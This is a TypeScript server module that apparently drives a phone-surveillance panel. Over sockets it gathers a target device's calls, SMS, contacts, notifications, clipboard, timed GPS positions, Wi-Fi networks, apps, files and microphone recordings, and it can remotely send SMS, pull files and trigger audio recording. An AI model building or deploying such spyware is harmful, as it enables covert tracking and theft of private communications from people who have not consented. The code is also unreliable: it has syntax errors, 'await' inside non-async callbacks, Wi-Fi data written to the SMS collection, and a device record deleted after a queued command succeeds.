import { IManager } from "./IManager";

import fs from 'fs';
import crypto from 'crypto';
import path from 'path';
import axios from 'axios';
import { User, Call, SMS, Notification, Contact, Wifi, Download, GPS, Device, } from "./models";
import ILog from "./entities/ILog";
import ILoggerRepository from "./repositories/ILoggerRepository";
import logTypes, { LoggerRepository } from "./repositories/implementations/LoggerRepository";
import { EMessageKeys, LogTypes } from "./config/enums";
import Command from "./models/command";
import { ICommand } from "./entities/IDevice";
import { DeviceRepository } from "./repositories/implementations/DeviceRepository";
import { Config } from "./config";

class Manager implements IManager {
    protected clientId: string
    protected deviceId: string
    protected realId: string
    protected clientConnections: object;
    protected gpsPollers: object;
    protected clientDatabases: object;
    protected ignoreDisconnects: object;
    protected instance: this;
    protected loggerRepository: ILoggerRepository<ILog>;
    protected deviceRepository: DeviceRepository;

    constructor(clientId: string, deviceId: string, realId: string) {
        this.clientId = clientId;
        this.deviceId = deviceId;
        this.realId = realId;
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.loggerRepository = new LoggerRepository();
        this.deviceRepository = new DeviceRepository();
    }

    // UPDATE

    async clientConnect(connection, clientData) {
        this.clientConnections[this.deviceId] = connection;

        if (this.deviceId in this.ignoreDisconnects) this.ignoreDisconnects[this.deviceId] = true;
        else this.ignoreDisconnects[this.deviceId] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[this.deviceId]);

        let client = await Device.findById(this.deviceId);
        if (client) {
            const newStatus = {
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                model: clientData?.device?.model,
                manufacture: clientData?.device?.manufacture,
                version: clientData?.device?.version,
                dynamicData: {
                    clientIP: clientData?.clientIP,
                    clientGeo: clientData?.clientGeo,
                }
            };
            await Device.findByIdAndUpdate(this.deviceId, { $set: newStatus });

            // this being the first run we should ask the client for all existing data?

        }
        this.setupListeners(this.clientId, this.deviceId);
    }

    async clientDisconnect(clientID) {
        // console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            // loggerRepository.log(LogTypes.info, deviceId: clientID + " Disconnected")
            const newStatus = {
                lastSeen: new Date(),
                isOnline: false,
            };
            await Device.findByIdAndUpdate(clientID, { $set: newStatus });

            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }

    async getClientDatabase(deviceId: string) {
        if (this.clientDatabases[deviceId]) return this.clientDatabases[deviceId];
        else {
            this.clientDatabases[deviceId] = await Device.findById(deviceId, { alerts: 0, commands: 0, areas: 0 });
            return this.clientDatabases[deviceId];
        }
    }

    log(type: any, msg: string) {
        this.loggerRepository.log({
            type: type,
            message: msg,
            deviceId: this.deviceId,
            clientId: this.clientId,
        });
    }

    async setupListeners(clientId: string, deviceId: string) {
        const loggerRepository = this.loggerRepository;
        const that = this;

        let socket = this.clientConnections[deviceId];
        let client = this.getClientDatabase(deviceId);

        // loggerRepository.log(LogTypes.info, deviceId: clientID + " Connected")
        socket.on('disconnect', () => this.clientDisconnect(deviceId));

        // Run the queued requests for this client
        const device = await this.deviceRepository.findById(deviceId, { commands: 1 });
        const commands = device?.commands;
        if (commands.length !== 0) {
            loggerRepository.log({ type: LogTypes.info, deviceId: deviceId, clientId: clientId, message: deviceId + " Running Queued Commands" });
            commands.forEach((command) => {
                this.sendCommand(deviceId, command.type, command, (error) => {
                    if (!error) await Device.findByIdAndDelete(deviceId);
                    else {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                        that.log(LogTypes.error, that.deviceId + " Queued Command (" + command.type + ") Failed");
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        this.gpsPoll(that.deviceId);


        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

        // socket.on(EMessageKeys.camera, (data) => {

        //     // {
        //     //     "image": <Boolean>,
        //     //     "buffer": <Buffer>
        //     // }

        //     if (data.image) {
        //         let uint8Arr = new Uint8Array(data.buffer);
        //         let binary = '';
        //         for (var i = 0; i < uint8Arr.length; i++) {
        //             binary += String.fromCharCode(uint8Arr[i]);
        //         }
        //         let base64String = window.btoa(binary);

        //         // save to file
        //         let epoch = Date.now().toString();
        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
        //             if (!error) {
        //                 // let's save the filepath to the database
        //                 client.get('photos').push({
        //                     time: epoch,
        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
        //                 }).write();
        //             }
        //             else return; // not ok
        //         })
        //     }
        // });

        socket.on(EMessageKeys.files, (data) => {
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String> 
            // }
            let that = this;
            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    Device.findByIdAndUpdate(
                        this.deviceId,
                        { $set: { currentFolder: data.list } }
                    ).then(_ => {
                        that.log(LogTypes.success, "File List Updated");
                    }).catch(e => {
                        this.log(LogTypes.error, deviceId + " File List ERROR: " + e.message);
                    })
                }
            } else if (data.type === "download") {
                // TODO: logic to upload on digitalocean space.
                // this.log(LogTypes.info, "Recieving File From" + this.clientId);

                // let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                // let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                // let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                // let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                // fs.writeFile(filePath, data.buffer, (error) => {
                //     if (!error) {
                //         // let's save the filepath to the database
                //         client.get('downloads').push({
                //             time: new Date(),
                //             type: "download",
                //             originalName: data.name,
                //             path: CONST.downloadsFolder + '/' + fileKey + fileExt
                //         }).write();
                //         loggerRepository.log(LogTypes.success, deviceId: "File From" + clientID + " Saved");
                //     }
                //     else console.log(error); // not ok
                // })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(EMessageKeys.call, (data) => {
            let that = this;
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;

                    const bulkOps = callsList.map(call => ({
                        updateOne: {
                            filter: { phoneNo: call.phoneNo, date: call.date },
                            update: { $setOnInsert: { ...call, deviceId: deviceId } }, // Apenas insere se não existir
                            upsert: true // Cria um novo documento se não encontrar um correspondente
                        }
                    }));

                    Call.bulkWrite(bulkOps).then(result => {
                        const insertedCount = result?.upsertedCount;
                        that.log(LogTypes.success, deviceId + " Call Log Updated - " + insertedCount + " New Calls");
                    }).catch(e => {
                        this.log(LogTypes.error, deviceId + " Call List ERROR: " + e.message);
                    })
                }
            }
        });

        socket.on(EMessageKeys.sms, (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    const bulkOps = smsList.map(call => ({
                        updateOne: {
                            filter: { phoneNo: call.address, date: call.date },
                            update: { $setOnInsert: { ...call, deviceId: deviceId } }, // Apenas insere se não existir
                            upsert: true // Cria um novo documento se não encontrar um correspondente
                        }
                    }));
                    SMS.bulkWrite(bulkOps).then(result => {
                        const insertedCount = result?.upsertedCount;
                        this.log(LogTypes.success, deviceId + " SMS List Updated - " + insertedCount + " New Messages");
                    }).catch(e => {
                        this.log(LogTypes.error, deviceId + " SMS List ERROR: " + e.message);
                    })
                }
            } else if (typeof data === "boolean") {
                this.log(LogTypes.success, deviceId + " SENT SMS");
            }
        });

        socket.on(EMessageKeys.mic, async (data) => {
            if (data.file) {
                this.log(LogTypes.info, "Recieving " + data.name + " from " + deviceId);

                //TODO: Implementar upload to space na digitalocean
                // let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
                // let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                // fs.writeFile(filePath, data.buffer, (e) => {
                //     if (!e) {
                //         const ipt = {
                //             "time": new Date(),
                //             "type": "voiceRecord",
                //             "originalName": data.name,
                //             // "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                //         }
                //         await Download.create(ipt);

                //     } else {
                //         console.log(e);
                //     }
                // })
            }
        });

        socket.on(EMessageKeys.location, async (data) => {
            try {
                if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                    let address;

                    if (Config.GEO_REVERSE) {
                        const gpsData = await axios(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${data.latitude}&lon=${data.longitude}`)
                        let bodyGps = gpsData.data;
                        if (bodyGps?.address) {
                            bodyGps = bodyGps.address;
                            address = `${bodyGps.road}, ${bodyGps.quarter}, ${bodyGps.city}, ${bodyGps.state}, ${bodyGps.country}, ${bodyGps.postcode}`
                        }
                    }
                    const ipt = {
                        time: new Date(),
                        enabled: data.enabled || false,
                        latitude: data.latitude || 0,
                        longitude: data.longitude || 0,
                        altitude: data.altitude || 0,
                        accuracy: data.accuracy || 0,
                        speed: data.speed || 0,
                        address: address,
                    }
                    await GPS.create(ipt);
                    this.log(LogTypes.success, deviceId + " GPS Updated");
                } else {
                    this.log(LogTypes.error, deviceId + " GPS Recieved No Data");
                    this.log(LogTypes.error, deviceId + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
                }
            } catch (error) {
                console.error(error)
            }
        });

        socket.on(EMessageKeys.clipboard, (data) => {
            // client.get('clipboardLog').push({
            //     time: new Date(),
            //     content: data.text
            // }).write();
            this.log(LogTypes.info, deviceId + " ClipBoard Recieved");
        });

        socket.on(EMessageKeys.notification, (data) => {
            let that = this;
            const ipt = {
                ...data,
                deviceId
            }
            Notification.findOneAndUpdate(
                { key: data.key, postTime: data.postTime }, // Filtro para encontrar o item
                { $set: { ...ipt, deviceId: deviceId } }, // Atualiza ou insere os valores do dispositivo
                { upsert: true, new: true, setDefaultsOnInsert: true } // Opções para upsert
            ).then(_ => {
                that.log(LogTypes.info, deviceId + " Notification Recieved");
            }).catch(e => {
                that.log(LogTypes.error, deviceId + " Notification ERROR: " + e.message);
            });
        });

        socket.on(EMessageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;

                    const bulkOps = contactsList.map(call => {
                        let phoneNo = call.phoneNo.replace(/\s+/g, '');
                        return {
                            updateOne: {
                                filter: { phoneNo: phoneNo, name: call.name },
                                update: {
                                    $setOnInsert: {
                                        ...call,
                                        deviceId: deviceId,
                                        phoneNo: phoneNo
                                    }
                                }, // Apenas insere se não existir
                                upsert: true // Cria um novo documento se não encontrar um correspondente
                            }
                        }
                    });
                    Contact.bulkWrite(bulkOps).then(result => {
                        const insertedCount = result?.upsertedCount;
                        this.log(LogTypes.success, deviceId + " Contacts Updated - " + insertedCount + " Contacts Added");
                    }).catch(e => {
                        this.log(LogTypes.error, deviceId + " Contacts ERROR: " + e.message);
                    })
                }
            }

        });

        socket.on(EMessageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let now = networks.map(item => {
                        item.firstSeen = new Date()
                        return item;
                    })
                    Device.findByIdAndUpdate(deviceId, { $set: { wifi: now } });

                    const bulkOps = networks.map(wifi => ({
                        updateOne: {
                            filter: { SSID: wifi.SSID, BSSID: wifi.BSSID },
                            update: {
                                $set: { lastSeen: new Date() },
                                $setOnInsert: { ...wifi, deviceId: deviceId },

                            }, // Apenas insere se não existir
                            upsert: true // Cria um novo documento se não encontrar um correspondente
                        }
                    }));
                    SMS.bulkWrite(bulkOps).then(result => {
                        const insertedCount = result?.upsertedCount;
                        this.log(LogTypes.success, deviceId + " WiFi Updated - " + insertedCount + " New WiFi Hotspots Found");
                    }).catch(e => {
                        this.log(LogTypes.error, deviceId + " WiFi ERROR: " + e.message);
                    })
                }
            }
        });

        socket.on(EMessageKeys.permissions, (data) => {
            Device.findByIdAndUpdate(deviceId, { $set: { enabledPermissions: data.permissions } })
                .then(result => this.log(LogTypes.success, deviceId + " Permissions Updated"));
        });

        socket.on(EMessageKeys.installed, (data) => {
            Device.findByIdAndUpdate(deviceId, { $set: { apps: data.apps } })
                .then(result => this.log(LogTypes.success, deviceId + " Apps Updated"));
        });
    }


    // GET
    async getClient(deviceId: string) {
        let client = await Device.findById(deviceId)
        if (client !== undefined) return client;
        else return false;
    }

    async getClientList(idUser: string) {
        const user = await User.findById(idUser);

        if (!user) {
            throw new Error("Usuario nao encontrado")
        }
        const devices = await Device.find({ _id: { $in: user?.devices } }).sort({ "license.activated": -1, isOnline: -1, lastSeen: -1 });
        return devices || [];
    }

    getClientListOnline() {
        return Device.find({ clientId: this.clientId, isOnline: true }).select({ isOnline: 1 });
    }
    getClientListOffline() {
        return Device.find({ clientId: this.clientId, isOnline: false }).select({ isOnline: 1 });
    }

    async getClientDataByPage(clientID, user, page, filter = undefined) {
        if (user.type === "operator") {
            if (!user.devices.includes(clientID)) {
                return false;
            }
        }
        if (user.type === "customer") {
            if (user.deviceId !== clientID) {
                return false;
            }
        }
        let device = await Device.findById(clientID);
        if (!device) {
            return false;
        }
        let data = {
            device,
            pageData: {}
        };

        if (page === "calls") {
            data.pageData = await Call.find({ deviceId: clientID }).sort({ createdAt: -1 });
            // if (filter) {
            //     await Call.find({ deviceId: clientID }).sort({ createdAt: -1 });
            //     let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
            //     if (filterData) pageData = filterData;
            // }
        }
        else if (page === "sms") {
            data.pageData = await SMS.find({ deviceId: clientID }).sort({ createdAt: -1 });
            // if (filter) {
            //     let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
            //     if (filterData) pageData = filterData;
            // }
        }
        else if (page === "notifications") {
            data.pageData = await Notification.find({ deviceId: clientID }).sort({ postTime: -1 });
            // if (filter) {
            //     let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().slice(0, 500).value().filter(not => not.appName === filter);
            //     if (filterData) pageData = filterData;
            // }
        }
        else if (page === "wifi") {
            const wifiLog = await Wifi.find({ deviceId: clientID }).sort({ createdAt: -1 });
            const wifiNow = await Device.findById(clientID).sort({ createdAt: -1 });
            data.pageData = {
                // _id:
                deviceId: clientID,
                log: wifiLog,
                now: wifiNow
            }
        }
        else if (page === "contacts") {
            data.pageData = await Contact.find({ deviceId: clientID }).sort({ createdAt: -1 });
        }
        else if (page === "permissions") {
            data.pageData = await User.findOne({ _id: clientID }).sort({ "enabledPermissions": -1 }).select({ enabledPermissions: 1 });
            // if (pageData) pageData = pageData.enabledPermissions;
        }
        else if (page === "clipboard") {
            data.pageData = await User.findOne({ _id: clientID }).sort({ "clipboardLog.time": -1 }).select({ clipboardLog: 1 });
            // if (pageData) pageData = pageData.clipboardLog;
        }
        else if (page === "apps") {
            data.pageData = await User.findOne({ _id: clientID }).sort({ "apps.appName": 1 }).select({ apps: 1 });
        }
        else if (page === "files") {
            data.pageData = await User.findOne({ _id: clientID }).sort({ "currentFolder.name": 1 }).select({ currentFolder: 1 });
        }
        else if (page === "downloads") {
            data.pageData = await Download.find({ deviceId: clientID, type: "download" }).sort({ createdAt: -1 });
        }
        else if (page === "microphone") {
            data.pageData = await Download.find({ deviceId: clientID, type: "voiceRecord" }).sort({ createdAt: -1 });
        }
        else if (page === "gps") {
            data.pageData = await GPS.find({ deviceId: clientID }).sort({ createdAt: -1 });
            if (data.pageData) {
                data.pageData = JSON.parse(JSON.stringify(data.pageData))
            }
        }
        else if (page === "info") {
            data.pageData = device;
        }
        // console.debug(pageData);
        return data;
    }

    // DELETE
    deleteClient(clientID) {
        Device.findByIdAndUpdate(clientID, { $set: { active: false, deletedAt: new Date() } });
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = { type: null }, cb = (error: any, message: any) => { }) {
        this.checkCorrectParams(commandID, commandPayload, async (error) => {
            try {
                if (!error) {
                    let res = await Device.findById(clientID);
                    let client = res.toJSON()
                    if (client !== undefined) {
                        commandPayload.type = commandID;
                        if (clientID in this.clientConnections) {
                            let socket = this.clientConnections[clientID];
                            this.log(LogTypes.info, "Requisição " + commandID + " de " + clientID);
                            socket.emit('order', commandPayload)
                            return cb(false, 'Requisição');
                        } else {
                            this.queCommand(clientID, commandPayload, (error) => {
                                if (!error) return cb(false, 'Comando na fila (o dispositivo está off-line)')
                                else return cb(error, undefined)
                            })
                        }
                    } else return cb('Cliente não existe!', undefined);
                } else return cb(error, undefined);
            } catch (e) {
                return cb(e, undefined);
            }
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commands: Array<ICommand> = await Device.findById(clientID).select({ commands: 1 });
        let outstandingCommands = [];
        commands.forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('Parece que uma solicitação semelhante já foi enviada');
        else {
            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commands.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === EMessageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === EMessageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === EMessageKeys.mic) {
            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === EMessageKeys.gotPermission) {
            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
        else if (Object.values(EMessageKeys).indexOf(commandID) >= 0) return cb(false)
        else return cb('Command ID Not Found');
    }

    async gpsPoll(clientID) {
        try {
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

            const device = await Device.findById(clientID).select({ gpsSettings: 1 });

            if (!device) {
                throw new Error("update null gpsPoll")
            }
            if (device.gpsSettings.updateFrequency > 0) {
                this.gpsPollers[clientID] = setInterval(() => {
                    loggerRepository.log(LogTypes.info, deviceId: clientID + " POLL COMMAND - GPS");
                    this.sendCommand(clientID, '0xLO')
                }, device.gpsSettings.updateFrequency * 1000);
            }
        } catch (e) {
            console.error(e)
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else return cb('Polling Too Short!')

    }
    async updateDeviceSettings(deviceId, input, cb) {
        try {
            if (input.updateFrequency >= 30) {
                const updated = await Device.findByIdAndUpdate(deviceId, { $set: { areasEnable: input.areasEnable, "gpsSettings.updateFrequency": input.updateFrequency } });
                cb(false);
                this.gpsPoll(deviceId);
            } else return cb('Intervalo de posição GPS muito curta!')
        } catch (e) {
            return cb('Não foi possivel salva as configurações')
        }
    }
    async updateDeviceAreas(deviceId, input, cb) {
        try {
            const { areas } = input;
            const updated = await Device.findByIdAndUpdate(deviceId, { $set: { areas: areas } }, { returnDocument: 'after' }).select({ areas: 1 });
            const response = updated.areas;
            cb(false, response);
            this.gpsPoll(deviceId);
        } catch (e) {
            return cb('Não foi possivel atualizar as areas')
        }
    }
}

export default Manager;